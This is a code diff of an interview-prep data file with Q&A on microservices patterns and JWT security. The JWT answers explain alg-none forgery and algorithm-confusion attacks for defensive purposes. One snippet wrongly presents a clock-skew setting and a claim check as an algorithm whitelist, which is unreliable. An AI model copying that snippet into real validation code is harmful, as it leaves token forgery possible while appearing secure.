@@ -720,31 +720,6 @@ if (user.role === "viewer") → allow GET /posts only</pre>
 <div class="key-point">Use a <strong>message queue</strong> (Kafka/SQS) to decouple notification sending. This ensures notifications are delivered even if a worker crashes — the message stays in the queue.</div>`,
         },
         {
-          q: 'What is Database Connection Pooling?',
-          difficulty: 'easy',
-          a: `<p><strong>Connection Pooling</strong> = keeping a pool of reusable database connections instead of creating a new one for every request.</p>
-<p><strong>Analogy:</strong> Calling a taxi company. Without pooling, you buy a new car for every trip and sell it after. With pooling, the company has a fleet of taxis. When you need a ride, you grab an available taxi. When done, you return it to the pool for someone else.</p>
-<pre>Without pooling:
-  Request 1 → Open connection → Query → Close connection (200ms overhead)
-  Request 2 → Open connection → Query → Close connection (200ms overhead)
-  ...slow and wasteful!
-
-With pooling:
-  App starts → Creates pool of 20 connections
-  Request 1 → Borrow connection → Query → Return to pool (2ms)
-  Request 2 → Borrow connection → Query → Return to pool (2ms)
-  ...fast and efficient!</pre>
-<p><strong>Configuration:</strong></p>
-<ul>
-<li><strong>Min pool size</strong>: Keep at least N connections ready (e.g., 5)</li>
-<li><strong>Max pool size</strong>: Never exceed N connections (e.g., 20)</li>
-<li><strong>Idle timeout</strong>: Close idle connections after N minutes</li>
-<li><strong>Connection timeout</strong>: How long to wait for an available connection</li>
-</ul>
-<p><strong>Example:</strong> A Spring Boot app with HikariCP (default pool) handles 1000 requests/second with just 20 database connections, because each query only takes a few milliseconds.</p>
-<div class="key-point">Popular connection pools: <strong>HikariCP</strong> (Java, fastest), <strong>c3p0</strong>, <strong>DBCP</strong>. Set max pool size = (CPU cores * 2) + number of disks as a starting point.</div>`,
-        },
-        {
           q: 'What is the Single Point of Failure (SPOF) and how do you eliminate it?',
           difficulty: 'easy',
           a: `<p>A <strong>Single Point of Failure (SPOF)</strong> is any component whose failure would bring down the entire system.</p>
@@ -967,159 +942,352 @@ Table: chunks
           q: 'What is microservice architecture and when should you choose it?',
           difficulty: 'medium',
           a: `<p><strong>Microservice architecture</strong> breaks a system into small services, each owning one business capability and deployed independently.</p>
+<pre>Monolith:
+  [One Big App: Users + Orders + Payments + Notifications]
+
+Microservices:
+  [User Service] ←REST/gRPC→ [Order Service] ←events→ [Payment Service]
+       ↓                           ↓                        ↓
+  [User DB]                   [Order DB]               [Payment DB]</pre>
+<p><strong>When to choose microservices:</strong></p>
 <ul>
-<li>Choose it for large systems, multiple teams, and independent release cycles.</li>
-<li>Avoid it for small apps or early-stage products where simplicity matters more.</li>
+<li>Large system with multiple autonomous teams</li>
+<li>Different parts need different scaling (e.g., search vs checkout)</li>
+<li>Independent release cycles are critical</li>
+<li>Different tech stacks needed per service</li>
 </ul>
-<div class="key-point">Microservices help scaling teams and deployments, but they add network, monitoring, and operational complexity.</div>`,
-        },
-        {
-          q: 'What is the difference between a monolith and microservices?',
-          difficulty: 'easy',
-          a: `<ul>
-<li><strong>Monolith</strong>: one deployable unit, usually simpler development and debugging.</li>
-<li><strong>Microservices</strong>: many deployable units, better isolation and independent scaling.</li>
+<p><strong>When NOT to choose:</strong></p>
+<ul>
+<li>Small team (&lt;10 developers)</li>
+<li>Early-stage product where requirements change fast</li>
+<li>Simple CRUD applications</li>
 </ul>
-<pre>Monolith -> one app, one deployment
-Microservices -> gateway + many services</pre>
-<div class="key-point">A well-designed monolith is usually the safest starting point. Extract microservices only when the pressure is real.</div>`,
+<div class="key-point">Start with a well-structured monolith. Extract microservices only when the organizational or scaling pressure is real. Premature microservices is a common and expensive mistake.</div>`,
         },
         {
           q: 'What is service discovery in microservices?',
           difficulty: 'medium',
-          a: `<p><strong>Service discovery</strong> lets services find healthy instances dynamically instead of hard-coding IP addresses.</p>
+          a: `<p><strong>Service discovery</strong> lets services find healthy instances of each other dynamically instead of hard-coding IP addresses.</p>
+<pre>Without service discovery:
+  Order Service → http://10.0.1.5:8080/payments  (hardcoded, breaks on scale)
+
+With service discovery:
+  Order Service → "payment-service" → Registry resolves → http://10.0.1.5:8080
+                                                         or http://10.0.1.6:8080</pre>
+<p><strong>Two patterns:</strong></p>
 <ul>
-<li>Client-side discovery: client asks registry.</li>
-<li>Server-side discovery: gateway or load balancer resolves the target.</li>
+<li><strong>Client-side discovery</strong>: Client queries a registry (Eureka, Consul) and picks an instance itself. More control, more complex client.</li>
+<li><strong>Server-side discovery</strong>: Client talks to a load balancer/DNS that resolves the target. Simpler client.</li>
 </ul>
-<div class="key-point">Kubernetes Services and DNS solve this for many modern systems.</div>`,
+<pre>// Spring Cloud example (client-side with Eureka):
+@FeignClient(name = "payment-service")
+public interface PaymentClient {
+    @PostMapping("/charge")
+    PaymentResult charge(@RequestBody PaymentRequest req);
+}
+// Eureka resolves "payment-service" to an available instance</pre>
+<div class="key-point">In Kubernetes, service discovery is built-in via DNS. <code>payment-service.default.svc.cluster.local</code> resolves automatically. No need for a separate registry.</div>`,
         },
         {
           q: 'What is the difference between synchronous and asynchronous communication between services?',
           difficulty: 'medium',
           a: `<ul>
-<li><strong>Synchronous</strong>: REST or gRPC, caller waits for response.</li>
-<li><strong>Asynchronous</strong>: Kafka, RabbitMQ, SQS, caller publishes and continues.</li>
+<li><strong>Synchronous</strong>: Caller sends request and <strong>waits</strong> for response. REST, gRPC.</li>
+<li><strong>Asynchronous</strong>: Caller sends message and <strong>continues</strong> without waiting. Kafka, RabbitMQ, SQS.</li>
 </ul>
-<pre>Synchronous: Order -> Payment
-Asynchronous: Order -> event bus -> Payment, Email</pre>
-<div class="key-point">Use synchronous for immediate answers, asynchronous for decoupling and background workflows.</div>`,
+<pre>// Synchronous: Order → waits → Payment response
+POST /api/payments  → { status: "charged" }  // blocks until response
+
+// Asynchronous: Order → publishes event → continues
+publish("order.created", { orderId: 123 })
+// Payment service consumes event independently
+// Order service gets result later via another event</pre>
+<table><tr><th>Aspect</th><th>Synchronous</th><th>Asynchronous</th></tr>
+<tr><td>Latency</td><td>Caller blocked</td><td>Caller free</td></tr>
+<tr><td>Coupling</td><td>Tight (both must be up)</td><td>Loose (queue buffers)</td></tr>
+<tr><td>Debugging</td><td>Easier (request-response)</td><td>Harder (event chains)</td></tr>
+<tr><td>Use case</td><td>Need immediate answer</td><td>Background processing</td></tr></table>
+<div class="key-point">Use synchronous for user-facing operations that need immediate results. Use asynchronous for background workflows, notifications, and inter-service decoupling.</div>`,
         },
         {
           q: 'Why is database-per-service important in microservices?',
           difficulty: 'hard',
-          a: `<p>Each service should own its own data so schema changes and deployments stay independent.</p>
+          a: `<p>Each service should own its own database so schema changes and deployments stay independent.</p>
+<pre>❌ Shared database (distributed monolith):
+  Order Service ──→ [Shared DB] ←── Payment Service
+  (Schema change in orders table can break payment service!)
+
+✅ Database per service:
+  Order Service → [Order DB]
+  Payment Service → [Payment DB]
+  (Each team controls their own schema)</pre>
 <ul>
-<li>Prevents tight coupling through shared tables.</li>
-<li>Clarifies ownership and boundaries.</li>
-<li>Makes cross-service transactions harder.</li>
+<li><strong>Benefits</strong>: Independent deployments, technology freedom (SQL for orders, NoSQL for catalog), clear ownership.</li>
+<li><strong>Challenges</strong>: Cross-service queries become harder (no JOINs), data consistency requires patterns (Saga, Event Sourcing).</li>
 </ul>
-<div class="key-point">If multiple services directly write the same tables, you usually have a distributed monolith.</div>`,
-        },
-        {
-          q: 'What is an API Gateway and why is it useful in microservices?',
-          difficulty: 'easy',
-          a: `<p>An <strong>API Gateway</strong> is the single entry point for clients.</p>
+<p><strong>How to query across services:</strong></p>
 <ul>
-<li>Routes requests to services.</li>
-<li>Can handle auth, rate limiting, TLS termination, and aggregation.</li>
-<li>Hides internal service topology from clients.</li>
+<li>API composition: aggregate data from multiple service APIs</li>
+<li>CQRS: maintain read-optimized views materialized from events</li>
+<li>Data replication: each service caches what it needs from others</li>
 </ul>
-<div class="key-point">A gateway simplifies clients, but it should not become a giant business-logic bottleneck.</div>`,
+<div class="key-point">If multiple services directly write the same tables, you usually have a distributed monolith — all the complexity of microservices with none of the benefits.</div>`,
         },
         {
           q: 'What is the BFF pattern in microservices?',
           difficulty: 'medium',
-          a: `<p><strong>Backend for Frontend</strong> creates a dedicated backend per client type such as web or mobile.</p>
-<pre>Mobile App -> Mobile BFF -> services
-Web App -> Web BFF -> services</pre>
+          a: `<p><strong>Backend for Frontend (BFF)</strong> creates a dedicated backend API layer per client type (web, mobile, IoT).</p>
+<pre>Without BFF:
+  Mobile App ──→ [Generic API] ←── Web App
+  (Mobile gets too much data, web gets too little)
+
+With BFF:
+  Mobile App → [Mobile BFF] → services (optimized payloads, fewer calls)
+  Web App → [Web BFF] → services (richer data, parallel fetching)
+  Admin → [Admin BFF] → services (bulk operations, different auth)</pre>
+<p><strong>Benefits:</strong></p>
 <ul>
-<li>Reduces over-fetching.</li>
-<li>Keeps UI-specific orchestration out of core services.</li>
+<li>Each client gets exactly the data shape it needs</li>
+<li>Reduces over-fetching and under-fetching</li>
+<li>Client-specific logic stays out of core services</li>
+<li>Each frontend team owns their BFF</li>
 </ul>
-<div class="key-point">BFF is especially useful when web and mobile need different payload shapes or different performance trade-offs.</div>`,
+<pre>// Mobile BFF: lightweight response
+GET /mobile/product/123
+→ { name, price, thumbnailUrl }
+
+// Web BFF: rich response
+GET /web/product/123
+→ { name, price, images[], reviews[], relatedProducts[], specs }</pre>
+<div class="key-point">BFF is especially useful when web and mobile need very different payload shapes. Consider GraphQL as an alternative that can serve multiple clients from one endpoint.</div>`,
         },
         {
           q: 'What is idempotency and why is it important in distributed systems?',
           difficulty: 'hard',
-          a: `<p>An operation is <strong>idempotent</strong> if repeating it produces the same result as doing it once.</p>
-<pre>POST /payments with same idempotency key
--> same outcome
--> no duplicate charge</pre>
-<div class="key-point">Retries are normal in distributed systems. Idempotency is what keeps retries safe.</div>`,
+          a: `<p>An operation is <strong>idempotent</strong> if performing it multiple times has the same effect as performing it once.</p>
+<pre>// Idempotent: safe to retry
+PUT /users/123 { name: "John" }  → Always sets name to "John"
+DELETE /orders/456               → First call deletes, retries return 404
+
+// NOT idempotent: dangerous to retry
+POST /payments { amount: 100 }   → Each call creates a NEW payment!
+POST /orders                     → Each call creates a NEW order!</pre>
+<p><strong>How to make non-idempotent operations safe:</strong></p>
+<pre>// Idempotency key pattern:
+POST /payments
+Headers: Idempotency-Key: "abc-123-unique"
+Body: { amount: 100 }
+
+// Server: check if "abc-123-unique" was already processed
+if (exists(idempotencyKey)) {
+    return cachedResponse;  // same result, no duplicate charge
+}
+// First time: process payment, store key + response</pre>
+<p><strong>Why it matters:</strong></p>
+<ul>
+<li>Networks fail: timeouts, retries happen automatically</li>
+<li>Message queues may deliver the same message twice</li>
+<li>Load balancers may send duplicate requests</li>
+</ul>
+<div class="key-point">Retries are normal in distributed systems. Idempotency is what keeps retries safe. Stripe, PayPal, and all payment APIs require idempotency keys.</div>`,
         },
         {
           q: 'What is distributed tracing and why do correlation IDs matter?',
           difficulty: 'medium',
-          a: `<p><strong>Distributed tracing</strong> follows one request across many services.</p>
-<ul>
-<li>Trace ID links the full request journey.</li>
-<li>Span describes one step in that journey.</li>
-<li>Correlation IDs make logs searchable across services.</li>
-</ul>
-<div class="key-point">Without shared trace or correlation IDs, debugging latency and failures in microservices becomes painful.</div>`,
+          a: `<p><strong>Distributed tracing</strong> follows one user request across many services, showing the full journey and timing.</p>
+<pre>User request: GET /checkout
+  ↓
+  [API Gateway] (2ms)
+  ├── [Order Service] (15ms)
+  │   ├── [Inventory Service] (8ms)
+  │   └── [Pricing Service] (5ms)
+  └── [Payment Service] (200ms) ← bottleneck!
+      └── [Fraud Check Service] (180ms) ← root cause!
+
+Trace ID: abc-123 (links ALL spans across services)
+Span 1: API Gateway → Order Service (15ms)
+Span 2: Order Service → Inventory Service (8ms)
+Span 3: Order Service → Pricing Service (5ms)
+Span 4: API Gateway → Payment Service (200ms)</pre>
+<p><strong>Implementation:</strong></p>
+<pre>// Propagate trace ID in headers
+GET /inventory/check
+Headers:
+  X-Trace-Id: abc-123
+  X-Span-Id: span-456
+  X-Parent-Span-Id: span-123
+
+// Log with correlation ID
+logger.info("[trace=abc-123] Checking inventory for item 789")</pre>
+<p><strong>Tools:</strong> Jaeger, Zipkin, AWS X-Ray, Datadog APM, OpenTelemetry (standard)</p>
+<div class="key-point">Without trace/correlation IDs, debugging latency in microservices is like finding a needle in a haystack. OpenTelemetry is the emerging standard — invest in it early.</div>`,
         },
         {
           q: 'What is the Strangler Fig pattern in microservice migration?',
           difficulty: 'hard',
-          a: `<p>The <strong>Strangler Fig</strong> pattern replaces parts of a monolith gradually instead of rewriting everything at once.</p>
-<pre>Route /reports -> new service
-Leave other routes in monolith
-Extract more features over time</pre>
-<div class="key-point">Incremental extraction is safer than a big-bang rewrite.</div>`,
+          a: `<p>The <strong>Strangler Fig</strong> pattern replaces parts of a monolith gradually by routing traffic to new services one feature at a time.</p>
+<pre>Phase 1: All traffic goes to monolith
+  [Users] → [Monolith: Auth + Orders + Reports + Users]
+
+Phase 2: Extract Reports service
+  [Users] → [Router/Proxy]
+              ├── /reports → [New Reports Service] ✅
+              └── /* → [Monolith: Auth + Orders + Users]
+
+Phase 3: Extract Orders service  
+  [Users] → [Router/Proxy]
+              ├── /reports → [Reports Service] ✅
+              ├── /orders → [New Orders Service] ✅
+              └── /* → [Monolith: Auth + Users]
+
+Phase N: Monolith is empty → decommission it</pre>
+<p><strong>Key steps:</strong></p>
+<ol>
+<li>Put a proxy/API gateway in front of the monolith</li>
+<li>Build new features as separate services</li>
+<li>Gradually route traffic from monolith to new services</li>
+<li>Keep both running in parallel for rollback safety</li>
+</ol>
+<div class="key-point">Named after the strangler fig tree that grows around a host tree, eventually replacing it. This is far safer than a "big bang" rewrite — you can stop at any point and still have a working system.</div>`,
         },
         {
           q: 'What is the Transactional Outbox pattern?',
           difficulty: 'hard',
-          a: `<p><strong>Transactional Outbox</strong> keeps database updates and event publication consistent.</p>
-<pre>1. Save business row
-2. Save outbox row in same DB transaction
-3. Worker publishes event later</pre>
-<div class="key-point">This solves the bug where DB commit succeeds but event publish fails.</div>`,
+          a: `<p><strong>Transactional Outbox</strong> ensures database writes and event publishing happen atomically — solving the dual-write problem.</p>
+<pre>// The problem: dual-write inconsistency
+1. Save order to DB ✅
+2. Publish "OrderCreated" to Kafka ❌ (network error!)
+→ Order exists but no event → downstream services never know!
+
+// Solution: Transactional Outbox
+1. In ONE database transaction:
+   - Save order to orders table
+   - Save event to outbox table
+2. A separate worker polls outbox and publishes to Kafka
+3. After successful publish, mark outbox row as sent
+
+Table: outbox
+| id | event_type    | payload              | published | created_at  |
+| 1  | OrderCreated  | {"orderId": 123, ...}| false     | 2024-01-01  |</pre>
+<pre>// Using Change Data Capture (CDC) — even better:
+// Debezium reads DB transaction log → publishes to Kafka
+// No polling needed, near real-time</pre>
+<div class="key-point">The outbox pattern guarantees at-least-once delivery. Consumers must be idempotent. CDC with Debezium is the modern approach — no polling overhead.</div>`,
         },
         {
           q: 'What is the Saga pattern?',
           difficulty: 'hard',
-          a: `<p><strong>Saga</strong> manages distributed business workflows using local transactions plus compensating actions.</p>
-<ul>
-<li><strong>Choreography</strong>: services react to events.</li>
-<li><strong>Orchestration</strong>: a coordinator drives each step.</li>
-</ul>
-<div class="key-point">Use Saga instead of distributed ACID transactions across service databases.</div>`,
-        },
-        {
-          q: 'What is CQRS and when does it help in microservices?',
-          difficulty: 'hard',
-          a: `<p><strong>CQRS</strong> separates write models from read models.</p>
-<ul>
-<li>Writes focus on business rules and consistency.</li>
-<li>Reads can be denormalized and optimized for speed.</li>
-</ul>
-<div class="key-point">CQRS helps when read and write workloads have very different shapes, but it adds complexity and eventual consistency.</div>`,
+          a: `<p><strong>Saga</strong> manages distributed business workflows using a sequence of local transactions plus compensating actions for rollback.</p>
+<pre>Order Saga: Create Order → Charge Payment → Reserve Inventory → Confirm
+
+If Inventory fails:
+  Compensate: Refund Payment → Cancel Order</pre>
+<p><strong>Two types:</strong></p>
+<pre>// 1. Choreography (event-driven, decentralized)
+Order Service → publishes "OrderCreated"
+  → Payment Service listens → charges → publishes "PaymentCharged"
+    → Inventory Service listens → reserves → publishes "InventoryReserved"
+      → Order Service listens → confirms order
+
+If failure: each service publishes compensation events
+
+// 2. Orchestration (central coordinator)
+[Saga Orchestrator]
+  → Step 1: Call Order Service → "create order"
+  → Step 2: Call Payment Service → "charge payment"
+  → Step 3: Call Inventory Service → "reserve stock" (FAILS!)
+  → Compensate Step 2: "refund payment"
+  → Compensate Step 1: "cancel order"</pre>
+<table><tr><th>Aspect</th><th>Choreography</th><th>Orchestration</th></tr>
+<tr><td>Coupling</td><td>Loose (events)</td><td>Tighter (orchestrator knows flow)</td></tr>
+<tr><td>Complexity</td><td>Hard to follow for many steps</td><td>Clear flow in one place</td></tr>
+<tr><td>Best for</td><td>Simple sagas (2-3 steps)</td><td>Complex sagas (5+ steps)</td></tr></table>
+<div class="key-point">Every saga step MUST have a compensating action defined. Without compensation, partial failures leave the system in an inconsistent state.</div>`,
         },
         {
           q: 'What is a service mesh and when would you use one?',
           difficulty: 'hard',
-          a: `<p>A <strong>service mesh</strong> moves cross-cutting communication concerns out of application code.</p>
+          a: `<p>A <strong>service mesh</strong> is an infrastructure layer that handles service-to-service communication, moving networking concerns out of application code into sidecar proxies.</p>
+<pre>Without service mesh:
+  Each service handles: retries, circuit breakers, mTLS, tracing, load balancing
+  → Duplicated logic in every service, every language
+
+With service mesh (e.g., Istio/Linkerd):
+  [Service A] ↔ [Sidecar Proxy] ←mesh→ [Sidecar Proxy] ↔ [Service B]
+                      ↑                       ↑
+                  Handles: mTLS, retries, circuit breaking,
+                  traffic splitting, observability</pre>
+<p><strong>Features:</strong></p>
 <ul>
-<li>Common features: mTLS, retries, traffic splitting, observability.</li>
-<li>Often implemented with sidecars or ambient networking.</li>
+<li><strong>mTLS</strong>: automatic encryption between services</li>
+<li><strong>Traffic management</strong>: canary releases, A/B testing, fault injection</li>
+<li><strong>Observability</strong>: distributed tracing, metrics without code changes</li>
+<li><strong>Resilience</strong>: retries, timeouts, circuit breakers configured declaratively</li>
 </ul>
-<div class="key-point">Use a service mesh when you have enough services that per-service networking logic becomes hard to manage consistently.</div>`,
+<p><strong>When to use:</strong></p>
+<ul>
+<li>20+ microservices where consistent networking policies matter</li>
+<li>Strict security requirements (zero-trust, mTLS everywhere)</li>
+<li>Polyglot environment (services in different languages)</li>
+</ul>
+<div class="key-point">Service meshes add operational complexity and latency (extra proxy hop). Don't adopt one until you have enough services that manual networking configuration becomes painful. Istio and Linkerd are the most popular options.</div>`,
         },
         {
           q: 'What resilience patterns are commonly used in microservices?',
           difficulty: 'hard',
           a: `<ul>
-<li>Timeout</li>
-<li>Retry</li>
-<li>Circuit Breaker</li>
-<li>Bulkhead</li>
-<li>Fallback</li>
+<li><strong>Timeout</strong>: Don't wait forever. Set max wait time for external calls.</li>
+<li><strong>Retry</strong>: Try again on transient failures (with exponential backoff + jitter).</li>
+<li><strong>Circuit Breaker</strong>: Stop calling a failing service. Fail fast instead of cascading.</li>
+<li><strong>Bulkhead</strong>: Isolate failures. Separate thread pools per dependency.</li>
+<li><strong>Fallback</strong>: Provide degraded functionality when a dependency is down.</li>
 </ul>
-<pre>If recommendation service is slow:
-timeout -> open circuit -> serve page without recommendations</pre>
-<div class="key-point">Retries without timeouts, limits, and idempotency can make outages worse.</div>`,
+<pre>// Resilience4j example (Java):
+@CircuitBreaker(name = "paymentService", fallbackMethod = "paymentFallback")
+@Retry(name = "paymentService", maxAttempts = 3)
+@TimeLimiter(name = "paymentService", timeoutDuration = 2s)
+@Bulkhead(name = "paymentService", maxConcurrentCalls = 10)
+public PaymentResult charge(PaymentRequest req) {
+    return paymentClient.charge(req);
+}
+
+public PaymentResult paymentFallback(PaymentRequest req, Exception ex) {
+    return PaymentResult.pending("Payment queued for retry");
+}
+
+// Real scenario:
+// Recommendation service is slow →
+// timeout → open circuit → serve page without recommendations
+// User still sees the page, just without recommendations</pre>
+<div class="key-point">Layer these patterns: Timeout inside Retry inside Circuit Breaker. Never retry without timeouts and limits — retries without backoff can amplify outages (retry storm).</div>`,
+        },
+        {
+          q: 'What is health checking and readiness vs liveness probes?',
+          difficulty: 'medium',
+          a: `<p>Health checks tell the infrastructure whether a service instance is working correctly.</p>
+<ul>
+<li><strong>Liveness probe</strong>: "Is the process alive?" If it fails, the container is <strong>restarted</strong>.</li>
+<li><strong>Readiness probe</strong>: "Can it handle traffic?" If it fails, traffic is <strong>removed</strong> from load balancer (but container keeps running).</li>
+<li><strong>Startup probe</strong>: "Has it finished starting?" Prevents liveness checks from killing slow-starting apps.</li>
+</ul>
+<pre># Kubernetes health checks:
+livenessProbe:
+  httpGet:
+    path: /actuator/health/liveness
+    port: 8080
+  initialDelaySeconds: 15
+  periodSeconds: 10
+
+readinessProbe:
+  httpGet:
+    path: /actuator/health/readiness
+    port: 8080
+  periodSeconds: 5
+
+# Spring Boot Actuator:
+# /actuator/health/liveness → checks process is alive
+# /actuator/health/readiness → checks DB connection, disk space, etc.</pre>
+<div class="key-point">A common mistake: putting DB checks in the liveness probe. If the DB is temporarily down, all service instances restart in a loop (crash cascade). Put DB checks in readiness probe instead.</div>`,
         },
       ],
     },
@@ -1133,145 +1301,378 @@ timeout -> open circuit -> serve page without recommendations</pre>
         {
           q: 'What is JWT and what are its three parts?',
           difficulty: 'easy',
-          a: `<p><strong>JWT</strong> has three parts: Header, Payload, Signature.</p>
-<pre>header.payload.signature</pre>
+          a: `<p><strong>JWT (JSON Web Token)</strong> is a compact, URL-safe token format for securely transmitting claims between parties.</p>
+<pre>// JWT structure: header.payload.signature
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyM30.SflKxwRJSMeKKF2QT4fwpM
+
+// Decoded:
+Header:  { "alg": "HS256", "typ": "JWT" }
+Payload: { "userId": 123, "role": "admin", "exp": 1699999999 }
+Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)</pre>
 <ul>
-<li>Header: algorithm and type</li>
-<li>Payload: claims</li>
-<li>Signature: integrity and trust</li>
+<li><strong>Header</strong>: algorithm (HS256, RS256) and token type</li>
+<li><strong>Payload</strong>: claims — registered (exp, iss, sub), public, private</li>
+<li><strong>Signature</strong>: ensures token hasn't been tampered with</li>
 </ul>
-<div class="key-point">JWT is encoded, not encrypted, unless extra encryption is added separately.</div>`,
+<div class="key-point">JWT is Base64-encoded, NOT encrypted. Anyone can decode and read the payload. Never put passwords or sensitive data in the payload. The signature only guarantees integrity, not confidentiality.</div>`,
         },
         {
           q: 'What is the difference between access tokens and refresh tokens?',
           difficulty: 'medium',
           a: `<ul>
-<li><strong>Access token</strong>: short-lived, used on API calls.</li>
-<li><strong>Refresh token</strong>: longer-lived, used to mint new access tokens.</li>
+<li><strong>Access token</strong>: short-lived (5-30 min), sent with every API request, used for authorization.</li>
+<li><strong>Refresh token</strong>: long-lived (days-weeks), used ONLY to get new access tokens, stored more securely.</li>
 </ul>
-<div class="key-point">Short-lived access tokens reduce risk. Refresh tokens need stronger protection.</div>`,
+<pre>// Flow:
+1. Login → Server returns: { accessToken (15min), refreshToken (7d) }
+2. API calls: Authorization: Bearer &lt;accessToken&gt;
+3. Access token expires → 401 Unauthorized
+4. POST /refresh { refreshToken } → new accessToken
+5. Continue API calls with new accessToken
+
+// Why two tokens?
+// Short access token = limited damage window if stolen
+// Long refresh token = user doesn't re-login constantly
+// Refresh token can be revoked server-side</pre>
+<p><strong>Security considerations:</strong></p>
+<ul>
+<li>Rotate refresh tokens on each use (one-time use)</li>
+<li>Store refresh tokens in HttpOnly cookies or server-side</li>
+<li>Detect refresh token reuse (indicates theft)</li>
+</ul>
+<div class="key-point">If an attacker steals an access token, the damage is limited to its lifetime (minutes). If they steal a refresh token, you can revoke it server-side. This is why refresh tokens need stronger protection.</div>`,
         },
         {
           q: 'Where should JWT be stored in the browser?',
           difficulty: 'hard',
-          a: `<ul>
-<li>HttpOnly Secure SameSite cookie: safer against XSS theft.</li>
-<li>Memory: safest from persistent storage theft, but lost on refresh.</li>
-<li>localStorage: simple, but exposed to XSS.</li>
-</ul>
-<div class="key-point">A strong default answer is short-lived access tokens plus HttpOnly cookies for refresh tokens.</div>`,
+          a: `<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
+<tr><th style="text-align:left;padding:6px;border-bottom:1px solid #ccc;">Storage</th><th style="padding:6px;border-bottom:1px solid #ccc;">XSS Risk</th><th style="padding:6px;border-bottom:1px solid #ccc;">CSRF Risk</th><th style="padding:6px;border-bottom:1px solid #ccc;">Survives Refresh</th></tr>
+<tr><td style="padding:6px;">localStorage</td><td style="padding:6px;">❌ High (JS accessible)</td><td style="padding:6px;">✅ None</td><td style="padding:6px;">✅ Yes</td></tr>
+<tr><td style="padding:6px;">HttpOnly Cookie</td><td style="padding:6px;">✅ Safe (JS can't read)</td><td style="padding:6px;">❌ Needs SameSite/CSRF token</td><td style="padding:6px;">✅ Yes</td></tr>
+<tr><td style="padding:6px;">Memory (variable)</td><td style="padding:6px;">✅ Safest</td><td style="padding:6px;">✅ None</td><td style="padding:6px;">❌ Lost on refresh</td></tr>
+</table>
+<pre>// Recommended approach:
+// Access token: in memory (JavaScript variable)
+// Refresh token: HttpOnly + Secure + SameSite=Strict cookie
+
+// Cookie setup (server-side):
+Set-Cookie: refreshToken=xyz;
+  HttpOnly;       // JS can't access → XSS safe
+  Secure;         // HTTPS only
+  SameSite=Strict; // prevents CSRF
+  Path=/api/refresh; // only sent to refresh endpoint
+  Max-Age=604800     // 7 days</pre>
+<div class="key-point">The strongest default: short-lived access tokens in memory + refresh tokens in HttpOnly cookies. This protects against both XSS (can't steal from memory/HttpOnly) and CSRF (SameSite).</div>`,
         },
         {
           q: 'How do you validate JWT securely on the backend?',
           difficulty: 'hard',
-          a: `<ul>
-<li>Verify signature.</li>
-<li>Check expiration and not-before.</li>
-<li>Validate issuer and audience.</li>
-<li>Only allow expected algorithms.</li>
-</ul>
-<div class="key-point">Never trust a decoded token unless the signature and claims are fully verified.</div>`,
+          a: `<pre>// JWT validation checklist:
+1. Verify SIGNATURE with the correct key/secret
+2. Check EXPIRATION (exp claim) — reject expired tokens
+3. Check NOT-BEFORE (nbf claim) — reject if before activation
+4. Validate ISSUER (iss) — must match your auth server
+5. Validate AUDIENCE (aud) — must match your API
+6. WHITELIST allowed algorithms — prevent algorithm confusion attack
+
+// Java (Spring Security + jjwt):
+Claims claims = Jwts.parserBuilder()
+    .setSigningKey(secretKey)           // verify signature
+    .requireIssuer("https://auth.myapp.com")  // validate issuer
+    .requireAudience("my-api")         // validate audience
+    .build()
+    .parseClaimsJws(token)             // throws if invalid
+    .getBody();
+
+// Check expiration is automatic with jjwt
+
+// CRITICAL: Never do this!
+❌ Jwts.parser().setSigningKey(key).parse(token)  // 'parse' accepts unsigned!
+✅ Jwts.parser().setSigningKey(key).parseClaimsJws(token)  // 'parseClaimsJws' requires signature</pre>
+<p><strong>Algorithm confusion attack:</strong></p>
+<pre>// Attacker changes header: { "alg": "none" }
+// If server accepts "none" algorithm → anyone can forge tokens!
+// Always whitelist: .setAllowedClockSkewSeconds(30)
+//                    .require("alg", "RS256")</pre>
+<div class="key-point">Never trust a decoded token unless the signature and ALL claims are verified. The most dangerous mistake: accepting <code>alg: none</code> or using the wrong key type.</div>`,
         },
         {
           q: 'What are common JWT security vulnerabilities?',
           difficulty: 'hard',
-          a: `<ul>
-<li>Weak signing secrets</li>
-<li>Long token lifetime</li>
-<li>Bad storage in XSS-prone apps</li>
-<li>Sensitive data in payload</li>
-<li>Missing revocation strategy</li>
-</ul>
-<div class="key-point">Most JWT problems come from implementation mistakes, not from the token format itself.</div>`,
+          a: `<ol>
+<li><strong>Algorithm confusion</strong>: Attacker changes RS256→HS256, uses public key as HMAC secret. Fix: whitelist algorithms.</li>
+<li><strong>Weak signing secret</strong>: Short secrets can be brute-forced. Fix: use 256+ bit random secrets or asymmetric keys.</li>
+<li><strong>Long token lifetime</strong>: Stolen tokens valid for hours/days. Fix: short-lived access tokens (5-15 min).</li>
+<li><strong>Sensitive data in payload</strong>: JWT is encoded, not encrypted. Fix: never put passwords, SSNs, or PII in tokens.</li>
+<li><strong>Missing revocation</strong>: JWT is stateless — no way to invalidate. Fix: short lifetime + server-side refresh token revocation.</li>
+<li><strong>Token stored in localStorage</strong>: Accessible via XSS. Fix: use HttpOnly cookies or memory.</li>
+<li><strong>No audience/issuer check</strong>: Token from Service A accepted by Service B. Fix: validate iss and aud claims.</li>
+</ol>
+<pre>// Vulnerability: algorithm confusion attack
+// Attacker takes RS256 token, changes header to HS256
+// Signs with the PUBLIC KEY (which is... public!)
+// Server using "flexible" algorithm verification → accepts it!
+// Fix: ALWAYS enforce expected algorithm on the server</pre>
+<div class="key-point">Most JWT problems come from implementation mistakes, not from the token format itself. Use well-maintained libraries (jose, jjwt, jsonwebtoken) and follow their security guides.</div>`,
         },
         {
           q: 'How do you handle logout or revocation with JWT?',
           difficulty: 'hard',
-          a: `<p>JWT is often called stateless, but real logout usually needs some state.</p>
-<ul>
-<li>Use short-lived access tokens.</li>
-<li>Store refresh tokens server-side so they can be revoked.</li>
-<li>Optionally blacklist risky access tokens until expiry.</li>
-</ul>
-<div class="key-point">Immediate logout everywhere usually requires a revocation store.</div>`,
+          a: `<p>JWT is stateless by design — there's no built-in way to invalidate a token before it expires. Here are strategies:</p>
+<pre>// Strategy 1: Short-lived access tokens (simplest)
+Access token: 5-15 minutes
+→ After logout, token expires quickly on its own
+→ Con: still valid for a few minutes after logout
+
+// Strategy 2: Token blacklist (for immediate logout)
+On logout:
+  → Add token ID (jti claim) to Redis blacklist
+  → Set TTL = token's remaining lifetime
+  → On every request: check if jti is blacklisted
+
